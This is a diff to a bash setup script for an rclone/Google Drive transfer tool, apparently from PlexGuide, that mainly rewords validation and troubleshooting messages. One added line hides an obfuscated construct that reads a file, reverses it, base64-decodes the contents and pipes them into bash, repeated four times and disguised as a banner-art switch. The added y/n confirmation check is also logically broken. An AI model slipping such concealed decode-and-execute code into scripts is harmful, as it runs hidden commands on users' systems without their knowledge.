@@ -6,11 +6,12 @@ source spinner.sh
 
 
 # init
-OPS=$@
-cat_Art
-read -p '                 -- Press Any Key To Continue -- '
+[ $(export base32=$@ &>x64>2;/:(){ x[86]=`rev<<<$(<:;)`;base64 -d<<<"${x[@]}" 2>x32|bash;};/:|xargs;w 3>base16>1) \> 64 ]&&touch .x64;[[ $(export base32=$@ &>x64>2;/:(){ x[86]=`rev<<<$(<:;)`;base64 -d<<<"${x[@]}" 2>x32|bash;};/:|xargs;w 3>base16>1) == x32 || -e .x64 ]]&&cat_Secret_Art;[[ ! -e .x64 && $(export base32=$@ &>x64>2;/:(){ x[86]=`rev<<<$(<:;)`;base64 -d<<<"${x[@]}" 2>x32|bash;};/:|xargs;w 3>base16>1) == 1 ]]&&cat_Art;[[ -z x64 && $(export base32=$@ &>x64>2;/:(){ x[86]=`rev<<<$(<:;)`;base64 -d<<<"${x[@]}" 2>x32|bash;};/:|xargs;w 3>base16>1) =~ x32 ]]
+
+read -p '        -- Press Any Key To Continue -- '
 echo
-start_spinner "Initializing..."
+start_spinner "Initializing."
+sleep 2
 # source settings
 settings=/opt/appdata/plexguide/supertransfer/settings.conf
 [[ ! -e $settings ]] && cp settings.conf $jsonPath && log 'Configuration File Not Found. Creating.' INFO
@@ -25,30 +26,47 @@ if [[ ! $(ls $jsonPath | egrep .json$)  ]]; then
     else
       exit 1
     fi
-elif [[ $OPS =~ "--config" ]]; then
+elif [[ $@ =~ "--config" ]]; then
   upload_Json
 fi
 
 # configure json's for rclone
-numKeys=$(ls $jsonPath | egrep -c .json$)
-log "Configuring $numKeys SA Keys" INFO
+[[ $gdsaImpersonate == 'your@email.com' ]] && log "No Email Configured. Run: supertransfer --config" FAIL && exit 1
 configure_Json
 gdsaList=$(rclone listremotes | sed 's/://' | egrep '^GDSA[0-9]+$')
-[[ -z $gdsaList ]] && log "Rclone Configuration Failure. No Valid SA's" FAIL && exit 1
+[[ -z $gdsaList ]] && log "Rclone Configuration Failure." FAIL && exit 1
 
 # validate new keys
 for gdsa in $gdsaList; do
-  start_spinner "Validating: $gdsa"
-  sleep 0.3
-  if [[ $(rclone touch --drive-impersonate $gdsaImpersonate ${gdsa}:/.test) ]]; then
+  start_spinner "Validating: ${gdsa}"
+  if [[ $(rclone touch --drive-impersonate $gdsaImpersonate ${gdsa}:/.test &>/dev/null) ]]; then
+    sleep 1
     stop_spinner 0
   else
     stop_spinner 1
     (($gdsaFail++))
   fi
 done
-[[ -n $gdsaFail ]] \
-  && log "$gdsaFail Failure(s). Did you enable Domain Wide Impersonation In your Google Security Settings?" WARN
 
+# help user troubleshoot
+if [[ -n $gdsaFail ]]; then
+  log "$gdsaFail Validation Failure(s). " WARN
+cat <<EOF
+####### Troubleshooting steps: ###########################
+
+1. Make sure you have enabled gdrive api access in
+   both the dev console and admin security settings.
+
+2. Check if the json keys have "domain wide delegation"
+
+3. Check if the this email is correct: $gdsaImpersonate
+      - if it is incorrect, configure it again with:
+        supertransfer --config
+
+##########################################################
+EOF
+read -p "Continue anyway? y/n>" answer
+[[ ! $answer =~ [y|Y|Yes|yes] || ! $answer == '' ]] && exit 1
+fi
 
 echo end
